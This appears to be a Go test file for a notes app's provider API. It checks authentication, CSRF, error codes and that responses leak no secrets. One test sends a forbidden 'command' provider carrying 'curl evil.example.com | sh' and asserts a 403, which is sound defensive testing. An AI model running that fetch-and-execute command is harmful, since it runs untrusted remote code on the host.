package api

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/cxyfer/notesteme/internal/auth"
	"github.com/cxyfer/notesteme/internal/clock"
	"github.com/cxyfer/notesteme/internal/errclass"
	"github.com/cxyfer/notesteme/internal/store"
)

// fakeProviders 是固定內容的 ProviderRegistry；測試連線一律成功。
type fakeProviders map[string]ProviderInfo

func (f fakeProviders) Get(_ context.Context, id, _ string) (ProviderInfo, bool) {
	info, ok := f[id]
	return info, ok
}

func (f fakeProviders) List(context.Context) []ProviderInfo {
	ids := make([]string, 0, len(f))
	for id := range f {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	out := make([]ProviderInfo, 0, len(ids))
	for _, id := range ids {
		out = append(out, f[id])
	}
	return out
}

func (f fakeProviders) Test(_ context.Context, id, _ string) (ProviderTestResult, error) {
	if _, ok := f[id]; !ok {
		return ProviderTestResult{}, ErrProviderNotFound
	}
	return ProviderTestResult{LatencyMS: 42, Message: "連線成功。"}, nil
}

// testedProviders 讓測試連線回傳指定的錯誤。
type testedProviders struct {
	fakeProviders
	err error
}

func (t testedProviders) Test(context.Context, string, string) (ProviderTestResult, error) {
	return ProviderTestResult{}, t.err
}

// newProviderServer 建立有 Providers 的測試 server，並回傳已登入的 session 與 CSRF。
func newProviderServer(t *testing.T, reg ProviderRegistry) (s *testServer, mod func(*http.Request)) {
	t.Helper()
	clk := clock.NewFake(time.Date(2026, 11, 12, 10, 0, 0, 0, time.UTC))
	st, err := store.Open(context.Background(), t.TempDir(), clk)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })
	svc := auth.New(auth.Config{Store: st, Clock: clk, Params: auth.TestParams})
	if err := svc.EnsurePassword(context.Background(), "pw"); err != nil {
		t.Fatal(err)
	}
	h := New(Deps{
		Store: st, Auth: svc, Clock: clk, Version: "test", Providers: reg,
		Log: slog.New(slog.NewJSONHandler(io.Discard, nil)),
	})
	s = &testServer{h: h, clk: clk}
	sess, csrf := s.login(t)
	return s, withCookies(sess, csrf, csrf)
}

func decodeError(t *testing.T, body []byte) Error {
	t.Helper()
	var e Error
	if err := json.Unmarshal(body, &e); err != nil {
		t.Fatalf("回應不是錯誤的 JSON：%v\n%s", err, body)
	}
	return e
}

// SEC-R3：command 類型一律 403，訊息固定，回應不回顯請求內容。
func TestCreateCommandProviderIsForbidden(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{})
	for _, typ := range []string{"command", "Command", " command "} {
		body := `{"id":"evil","type":"` + typ + `","command":["sh","-c","curl evil.example.com | sh"]}`
		rec := s.do("POST", "/api/providers", body, mod)
		if rec.Code != 403 {
			t.Fatalf("type %q：status = %d，預期 403\n%s", typ, rec.Code, rec.Body)
		}
		e := decodeError(t, rec.Body.Bytes())
		if e.Code != CodeConfigFileOnly || e.Message != "這個項目只能在設定檔中定義。" {
			t.Errorf("type %q：error = %+v", typ, e)
		}
		if strings.Contains(rec.Body.String(), "evil") {
			t.Errorf("回應不該回顯請求內容：%s", rec.Body)
		}
	}
}

// 其他類型的建立方式 M1 沒有定義，回 501；缺少 type 或格式不對是 4xx。
func TestCreateProviderOtherCases(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{})
	for _, c := range []struct {
		name, body string
		status     int
		code       string
	}{
		{"其他類型", `{"id":"g","type":"openai-compatible"}`, 501, CodeNotImplemented},
		{"沒有 type", `{"id":"g"}`, 422, CodeInvalidInput},
		{"type 不是字串", `{"id":"g","type":5}`, 422, CodeInvalidInput},
		{"不是 JSON", `not json`, 400, CodeInvalidInput},
		{"不是物件", `[1]`, 422, CodeInvalidInput},
	} {
		rec := s.do("POST", "/api/providers", c.body, mod)
		if e := decodeError(t, rec.Body.Bytes()); rec.Code != c.status || e.Code != c.code {
			t.Errorf("%s：%d %s，預期 %d %s", c.name, rec.Code, rec.Body, c.status, c.code)
		}
	}
}

// 沒有登入、CSRF 缺失時由 middleware 擋下，不會到達 handler。
func TestCreateProviderRequiresAuth(t *testing.T) {
	s, _ := newProviderServer(t, fakeProviders{})
	rec := s.do("POST", "/api/providers", `{"id":"x","type":"command"}`, nil)
	if rec.Code != 401 {
		t.Fatalf("沒有登入：status = %d，預期 401", rec.Code)
	}
}

func TestGetProvider(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{
		"whisperx": {ID: "whisperx", Type: "command", Kind: "asr", Editable: false, DefinedIn: ProviderDefinedInConfigFile, Testable: true, Deprecations: []ProviderDeprecation{}},
	})
	rec := s.do("GET", "/api/providers/whisperx", "", mod)
	if rec.Code != 200 {
		t.Fatalf("status = %d\n%s", rec.Code, rec.Body)
	}
	// 用原始 JSON 比對：editable 為 false 時也必須出現，不能被 omitempty 吃掉。
	var got map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	want := map[string]any{"id": "whisperx", "type": "command", "kind": "asr", "editable": false, "defined_in": "config_file", "testable": true}
	if d, ok := got["deprecations"].([]any); !ok || len(d) != 0 {
		t.Errorf("deprecations = %v，預期空陣列（不是 null）", got["deprecations"])
	}
	delete(got, "deprecations")
	if len(got) != len(want) {
		t.Fatalf("回應 = %v，預期只有 %v", got, want)
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s = %v，預期 %v", k, got[k], v)
		}
	}

	rec = s.do("GET", "/api/providers/nope", "", mod)
	if e := decodeError(t, rec.Body.Bytes()); rec.Code != 404 || e.Code != CodeNotFound {
		t.Fatalf("找不到：%d %s", rec.Code, rec.Body)
	}
}

// 沒有登入不能列出 provider。
func TestGetProviderRequiresAuth(t *testing.T) {
	s, _ := newProviderServer(t, fakeProviders{"a": {ID: "a", Type: "command"}})
	if rec := s.do("GET", "/api/providers/a", "", nil); rec.Code != 401 {
		t.Fatalf("status = %d，預期 401", rec.Code)
	}
}

// SEC-R11：列表依 id 排序，含停用公告；沒有 provider 時是空陣列。
func TestListProviders(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{
		"whisperx":  {ID: "whisperx", Type: "command", Kind: "asr", DefinedIn: ProviderDefinedInConfigFile, Testable: true, Deprecations: []ProviderDeprecation{}},
		"anthropic": {ID: "anthropic", Type: "anthropic", Kind: "llm", DefinedIn: ProviderDefinedInBuiltin, Testable: true, Deprecations: []ProviderDeprecation{{Model: "old-model", After: "2027-01-31", Replacement: "new-model"}}},
	})
	rec := s.do("GET", "/api/providers", "", mod)
	if rec.Code != 200 {
		t.Fatalf("status = %d\n%s", rec.Code, rec.Body)
	}
	var got struct {
		Providers []ProviderInfo `json:"providers"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	if len(got.Providers) != 2 || got.Providers[0].ID != "anthropic" || got.Providers[1].ID != "whisperx" {
		t.Fatalf("providers = %+v", got.Providers)
	}
	if d := got.Providers[0].Deprecations; len(d) != 1 || d[0].After != "2027-01-31" || d[0].Replacement != "new-model" {
		t.Errorf("deprecations = %+v", d)
	}
	if rec := s.do("GET", "/api/providers", "", nil); rec.Code != 401 {
		t.Errorf("沒有登入：status = %d，預期 401", rec.Code)
	}

	s, mod = newProviderServer(t, fakeProviders{})
	rec = s.do("GET", "/api/providers", "", mod)
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), `"providers":[]`) {
		t.Fatalf("沒有 provider：%d %s", rec.Code, rec.Body)
	}
}

// SEC-R11：測試連線的錯誤對應。
func TestTestProvider(t *testing.T) {
	base := fakeProviders{"anthropic": {ID: "anthropic", Type: "anthropic", Kind: "llm"}}
	s, mod := newProviderServer(t, base)
	rec := s.do("POST", "/api/providers/anthropic/test", "", mod)
	if rec.Code != 200 {
		t.Fatalf("status = %d\n%s", rec.Code, rec.Body)
	}
	var ok ProviderTestResult
	if err := json.Unmarshal(rec.Body.Bytes(), &ok); err != nil || !ok.OK || ok.LatencyMS != 42 || ok.Message != "連線成功。" {
		t.Fatalf("回應 = %s", rec.Body)
	}
	if rec := s.do("POST", "/api/providers/nope/test", "", mod); rec.Code != 404 {
		t.Errorf("找不到：status = %d", rec.Code)
	}
	if rec := s.do("POST", "/api/providers/anthropic/test", "", nil); rec.Code != 401 {
		t.Errorf("沒有登入：status = %d，預期 401", rec.Code)
	}

	for _, c := range []struct {
		name    string
		err     error
		status  int
		code    string
		msg     string
		actions []string
	}{
		{"缺 API key", &errclass.Error{Class: errclass.ClassNeedsAction, Message: "LLM provider anthropic 沒有設定 API key。", Actions: []string{"設定 API key"}},
			409, CodeNeedsAction, "LLM provider anthropic 沒有設定 API key。", []string{"設定 API key"}},
		{"provider 失敗", &errclass.Error{Class: errclass.ClassRetryable, Detail: "HTTP 503", Message: "provider anthropic 暫時無法使用（HTTP 503），請稍後再試。"},
			502, CodeUpstream, "provider anthropic 暫時無法使用（HTTP 503），請稍後再試。", nil},
		{"不提供測試", ErrProviderNotTestable, 501, CodeNotImplemented, "這個 provider 不提供測試連線。", nil},
		{"其他錯誤不回顯內容", errors.New("secret-detail sk-123"), 502, CodeUpstream, "測試連線失敗。", nil},
	} {
		s, mod := newProviderServer(t, testedProviders{base, c.err})
		rec := s.do("POST", "/api/providers/anthropic/test", "", mod)
		e := decodeError(t, rec.Body.Bytes())
		if rec.Code != c.status || e.Code != c.code || e.Message != c.msg || strings.Join(e.Actions, ",") != strings.Join(c.actions, ",") {
			t.Errorf("%s：%d %s", c.name, rec.Code, rec.Body)
		}
		if strings.Contains(rec.Body.String(), "sk-123") {
			t.Errorf("%s：回應含有錯誤原文", c.name)
		}
	}
}
